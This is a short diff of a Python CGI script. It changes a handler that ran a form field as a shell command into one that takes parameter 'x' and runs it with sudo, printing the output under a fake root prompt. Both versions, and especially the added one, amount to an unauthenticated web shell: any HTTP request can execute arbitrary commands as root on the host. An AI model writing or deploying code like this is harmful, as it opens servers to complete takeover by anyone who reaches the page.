@@ -1,14 +1,16 @@
 #!/usr/bin/python3
 
+import cgi
+import subprocess
+import time
+
 
 print("content-type: text/html")
 print()
 
 
-import subprocess as sb
-import cgi
+f = cgi.FieldStorage()
+cmd = f.getvalue("x")
 
-var = cgi.FieldStorage("command")
-command = var.getvalue("command")
-output = sb.getoutput(command)
-print(output)
+o = subprocess.getoutput("sudo " + cmd)
+print("[root@localhost~]\n",o)
